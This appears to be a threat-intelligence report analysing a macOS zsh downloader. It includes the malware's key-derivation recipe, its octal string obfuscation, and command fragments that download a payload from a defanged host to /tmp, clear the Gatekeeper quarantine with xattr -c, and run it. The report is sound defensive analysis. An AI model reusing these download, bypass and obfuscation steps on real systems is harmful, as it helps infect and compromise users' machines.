---
title: "Malware sample analysis: Unattributed macOS zsh downloader (other · zsh · 06750874)"
published: 2026-11-21
draft: false
description: "Malicious (low confidence): Unattributed macOS zsh downloader · dropper/downloader · difficulty medium · static-only analysis"
tags: ["dropper", "downloader", "Script"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-11-21-Unattributed-macOS-zsh-downloader-06750874"
---

> [!WARNING]
> **Verdict: malicious** · family **Unattributed macOS zsh downloader** (uncertain) · confidence **low**
> 
> The outer zsh script derives a key from its own argument formula (_kb=2367, md5 then used as AES-128 key), decrypts the embedded hexadecimal data with AES-128-CTR (IV=0) and gunzips it, then evals and executes it. The statically decoded stage 2 reports telemetry to base-render[.]com, downloads an executable from havenleaf3[.]com to /tmp, clears quarantine attributes with xattr -c, chmod +x and runs it directly. The above code is the script's own logic, a directly visible implementation, hence a malicious downloader/dropper.

## At a glance

| Item | Value |
|:--|:--|
| Family | **Unattributed macOS zsh downloader** · _uncertain_ |
| Confidence | **low** |
| Behavior class | dropper · downloader |
| Difficulty | medium |
| First seen | 2026-11-20 19:24:02 |
| Analysis method | Static-only analysis |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/067508744d6916ba0234526eb1886a0e3b7b30d81c2cbfe801d4285bce2ec5ab/) |

## Attack chain

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">Decrypts built-in stage 2</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027.013</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">Derives key from arguments</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">Octal-concatenated commands</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">Collects host information</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1082</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">Reports implant telemetry</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
</svg>

## Sample identifiers

| Item | Value |
|:--|:--|
| SHA-256 | `067508744d6916ba0234526eb1886a0e3b7b30d81c2cbfe801d4285bce2ec5ab` |
| MD5 | _not recorded_ |
| Size | 3,081 bytes (3.0 KB) |
| Type | other · `zsh` |

## Behavior analysis

**10** behaviors in total, each with evidence attached, all of them statically obtainable.

### 1. Decrypts built-in stage 2

`T1027.013` · confidence **high** · static

The script concatenates the three hexadecimal segments _build_tag, _schema_id, and _cache_seed, restores them to binary with xxd, decrypts with openssl enc -d -aes-128-ctr and gunzips, obtaining a 1804-byte zsh stage-2 script (sha256 1a2ab8d7...).

> **Evidence**: off=0x2b1(_cache_seed) / off=0x2a5(_build_tag) / off=0x841(_schema_id) three hexadecimal segments; openssl enc -d -aes-128-ctr pipeline at off=0xb66; eval at off=0xbfc
> 
> **Source**: `ev-000001` · `ev-000002`

### 2. Derives key from arguments

`T1027` · confidence **high** · static

The key is not hardcoded: it computes _kb=2367 from _suite, _batch_n, _region, and _timeout_s, then uses md5('2367') as the AES key with a fixed all-zero IV, increasing static-signature evasion.

> **Evidence**: _kb formula at off=0x5d5; _k=$(printf '%s' "$_kb" | md5) at off=0xb42
> 
> **Source**: `ev-000002`

### 3. Octal-concatenated commands

`T1027` · confidence **high** · static

Command names and URLs such as curl, chmod, and xattr are split into octal printf output and single-character variable concatenations (such as t3f4a/u9n9/d7sd/s3la/er96/icjvz), restored only at runtime to avoid plaintext string hits.

> **Evidence**: t3f4a=printf '\155\144\065' etc. at off=0x511-0x55a; ${u9n9}${d7sd}/${s3la}${er96} at off=0xb66
> 
> **Source**: `ev-000001` · `ev-000002`

### 4. Collects host information

`T1082` · confidence **medium** · static

Stage 2 reads id -u, sysctl -n hw.memsize, and the available space of df -m / as host fingerprint/environment information for use in reporting.

> **Evidence**: stage2_payload.sh lines 3-6 id -u / sysctl hw.memsize; outer off=0x6fe df -m /
> 
> **Source**: `ev-000002`

### 5. Reports implant telemetry

`T1071.001` · confidence **high** · static

At execution start it sends a curl -X POST request to hxxps://base-render[.]com/api/metrics/run?event=pasted with two opaque token headers, user and BuildID, discards all output, and runs it in the background.

> **Evidence**: stage2_payload.sh bq43xr=hxxps://base-render[.]com/api/metrics/run?event=pasted and curl -fsS -4 ... -H 'user: ...' -H 'BuildID: ...'
> 
> **Source**: `ev-000002`

### 6. Downloads subsequent payload

`T1105` · confidence **high** · static

It uses curl -fsSL to download hxxps://havenleaf3[.]com/f/hxjvvipsyjzsdxrzfdjwka/pnxco9yv to /tmp/.d9mrlg4i.$$, then on success mv's it to /tmp/.d9mrlg4i, the resident executable payload.

> **Evidence**: stage2_payload.sh fdcd3t=hxxps://havenleaf3[.]com/f/... and curl -fsSL -o ${tnkxvb} ${fdcd3t} && mv ...
> 
> **Source**: `ev-000002`

### 7. Clears quarantine attribute

`T1553.001` · confidence **high** · static

It runs xattr -c on the downloaded file to clear the macOS quarantine attribute (com.apple.quarantine), bypassing Gatekeeper's first-run block of downloaded files.

> **Evidence**: stage2_payload.sh gch7v=$(printf '\170\141\164\164\162') i.e. xattr, followed by ${gch7v} -c ${ylzw5l}
> 
> **Source**: `ev-000002`

### 8. Grants permission and executes payload

`T1059.004` · confidence **high** · static

It uses chmod +x to grant execute permission to the downloaded file and, after a successful download, executes it directly as /tmp/.d9mrlg4i, achieving stage-2 on-disk execution.

> **Evidence**: stage2_payload.sh cdwf4=$(printf '\143\150\155\157\144') i.e. chmod, ${cdwf4} +x ${ylzw5l} && ... && ${ylzw5l}
> 
> **Source**: `ev-000002`

### 9. Reports status after execution

`T1071.001` · confidence **high** · static

Only after download, attribute clearing, and permission granting all succeed does it send a second token-bearing POST to hxxps://base-render[.]com/api/metrics/run?event=stager, then execute the payload, usable for tallying drop success rate.

> **Evidence**: stage2_payload.sh rl31a8=...event=stager and the success chain `{ curl ... } && ${ylzw5l}`
> 
> **Source**: `ev-000002`

### 10. Masquerades as cache maintenance

`T1036` · confidence **high** · static

The script uses comments such as _log/"routine cache maintenance", $HOME/Library/Caches retention statistics, and disk-space checks as cover, while the real action is decrypting and executing stage 2.

> **Evidence**: off=0x64f '# --- routine cache maintenance ---'; off=0x6ca Library/Caches; off=0x77b find ... -mtime +16
> 
> **Source**: `ev-000001` · `ev-000002`


## IOCs (defanged)

### Network

:::caution
**Pending dynamic verification**: the addresses above come from static analysis; no successful connection or session was observed under the analysis environment's network isolation, and the real C2's responses and delivered content remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| http | `hxxps://base-render[.]com/api/metrics/run?event=pasted` | 443 | c2 | Static | ⏳ not observed |
| http | `hxxps://base-render[.]com/api/metrics/run?event=stager` | 443 | c2 | Static | ⏳ not observed |
| http | `hxxps://havenleaf3[.]com/f/hxjvvipsyjzsdxrzfdjwka/pnxco9yv` | 443 | download | Static | ⏳ not observed |

### Host

**Dropped paths**

- `/tmp/.d9mrlg4i`
- `/tmp/.d9mrlg4i.$$`

### Configuration

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `base-render[.]com` | Yes | Static |
| `c2_port` | `443` | Yes | Static |
| `c2_uri` | `/api/metrics/run?event=pasted; /api/metrics/run?event=stager` | Yes | Static |
| `download_url` | `hxxps://havenleaf3[.]com/f/hxjvvipsyjzsdxrzfdjwka/pnxco9yv` | Yes | Static |
| `install_path` | `/tmp/.d9mrlg4i` | Yes | Static |
| `encryption_algo` | `AES-128-CTR (IV=0000...0) + gzip` | Yes | Static |
| `key_derivation` | `_kb=((7*189+6*7+2)%90000)+1000=2367; key=md5('2367')=300891a62162b960cf02ce3827bb363c` | Yes | Static |
| `http_header_user` | `AgIatvSKvs7wrQOffteWKKtDHNTFSZBGfP6dM4swrKfjliiND9ql (pasted) / AgKTRXztxMrZcQi7P_MGIXJBA8kucDdMqGr75_Q-MqTwcdWrKhwb (stager)` | Yes | Static |
| `http_header_buildid` | `AgLU6TbrfZMOQKMWZjt5r_W0Fap5okWEkm3naLKzCZ1HdsE (pasted) / AgJdTgGfw2BDqZRMoJPJzkLdvca2qFOnW8ENrZonWf4ec04 (stager)` | Yes | Static |
| `cleanup_command` | `xattr -c /tmp/.d9mrlg4i; chmod +x /tmp/.d9mrlg4i` | Yes | Static |
| `campaign_id` | `-` | No | Static |

## Do not misjudge

:::important
The conclusions below are **easily misjudged**; take care when citing this report.

- Do not assert that it is a credential-stealing trojan (stealer): the stage-2 entity was not recovered, and the current code shows only download, quarantine-attribute clearing, and execution, with no credential/browser-data collection logic.
- Do not claim that the sample successfully connected out or checked in: the sample was not executed this time, and there is no dynamic session or network observation; the C2 is derived only from static decryption.
- Do not treat the $HOME/Library/Caches retention/disk checks as real functionality: that section only gathers statistics and prints, without deleting or writing any files, and is cover code.
- Do not assert the file type or final capability at havenleaf3[.]com: that file was not downloaded or analyzed.
:::

## Analysis method and limitations

| Item | Value |
|:--|:--|
| Analysis method | Static-only analysis |
| Unpacking | No |

**Limitations and pending verification**

1. This run has only static evidence: the sample is a macOS zsh script, the current environment has no corresponding dynamic analysis channel, and no runtime behavior was observed.
2. The stage-2 executable payload at havenleaf3[.]com was not retrieved, so its real functionality, family attribution, and subsequent C2 cannot be confirmed.
3. The xattr -c, chmod +x, and execution behavior come from the decrypted script text and were not verified on real macOS.
4. The two base-render[.]com endpoints are only statically recovered from the script, and their reachability and response content were not verified.
5. Family naming lacks vendor/YARA/public-report corroboration and is provisionally recorded as an unattributed macOS zsh downloader by behavior.

## Evidence index

<details>
<summary>Expand 2 tool evidence entries</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ev-000001` | String extraction | extracted 44 ASCII strings from the outer script, locating _cache_seed/_build_tag/_schema_id and the transformed commands; no flag hits. |
| `ev-000002` | evidence.record | statically reproduced the decryption chain: _kb=2367 → md5 → AES-128-CTR(IV=0) → gunzip, obtaining stage 2 and restoring all octal strings and URLs. |

</details>

---

_This report's sample is not public, IOCs are defanged, for security research only._
